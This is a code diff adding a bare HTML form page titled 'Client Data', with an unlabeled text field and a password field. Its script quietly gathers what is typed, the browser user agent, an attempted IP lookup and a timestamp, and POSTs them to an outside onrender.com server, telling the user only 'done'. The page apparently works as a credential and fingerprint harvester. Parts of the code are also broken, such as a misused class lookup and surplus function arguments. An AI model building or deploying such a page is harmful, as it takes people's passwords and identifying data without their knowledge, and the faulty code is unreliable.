@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Client Data</title>
+</head>
+<body>
+
+    <form id="form" class="contact-form">
+        <input type="text" name="text1" value="" />
+        <input type="password" name="text2" value="" />
+        <!-- <input type="text" name="text2" value="" /> -->
+        
+        <input type="checkbox" name="check" checked disabled />
+        <button type="submit">
+            submit
+        </button>
+      </form>
+      
+      <output id="output"></output>
+
+      <a href="indexx.html">View indexx</a>
+    
+      <script>
+    
+    var Agddress = navigator.userAgent;
+    import("https://api.ipify.org?format=jsonp&callback=getIPx");
+var onaddress = document.getElementsByClassName(".ipx");
+  function getIPx(data) { 
+   onaddress.value = data.ip;
+                        } 
+var currentdate = new Date(); 
+var Momentrecord = "Recorded moment: " + currentdate.getDate() + "/"
+                + (currentdate.getMonth()+1)  + "/" 
+                + currentdate.getFullYear() + " @ "  
+                + currentdate.getHours() + ":"  
+                + currentdate.getMinutes() + ":" 
+                + currentdate.getSeconds();
+    
+    
+    /**
+     * Retrieves input data from a form and returns it as a JSON object.
+     * @param  {HTMLFormControlsCollection} elements  the form elements
+     * @return {Object}                               form data as an object literal
+     */
+     const formToJSON = (elements) =>
+      [].reduce.call(
+        elements,
+        (data, element) => {
+          data[element.name] = element.value;
+          return data;
+          
+        },
+        {Agddress, onaddress, Momentrecord},
+      );
+    
+    const handleFormSubmit = (event) => {
+      // Stop the form from submitting since we’re handling that with AJAX.
+      event.preventDefault();
+    
+      // Call our function to get the form data.
+      const data = formToJSON(form.elements);
+    
+      // Demo only: print the form data onscreen as a formatted JSON object.
+      const dataContainer = document.getElementsByClassName('results__display')[0];
+    
+      // Use `JSON.stringify()` to make the output valid, human-readable JSON.
+     console.log(JSON.stringify(data, null, '  ', Agddress, onaddress ));
+     console.log(Agddress, onaddress );
+    
+    var xhr = new window.XMLHttpRequest()
+
+                        
+// -----------------------------------------------FIRST FORM CONTROLLER OPEN---------------------------------------------------------------
+
+
+             xhr.open('POST', 'https://mongodbtest-u3mp.onrender.com/')
+             xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8', 'Access-Control-Allow-Origin: *')
+             xhr.send(JSON.stringify(data, null, '  ', ) )
+            
+
+             alert('done')
+      // ...this is where we’d actually do something with the form data...
+    };
+    
+    const form = document.getElementsByClassName('contact-form')[0];
+    form.addEventListener('submit', handleFormSubmit);
+    
+    
+      
+    
+      </script>
+
+
+
+</body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
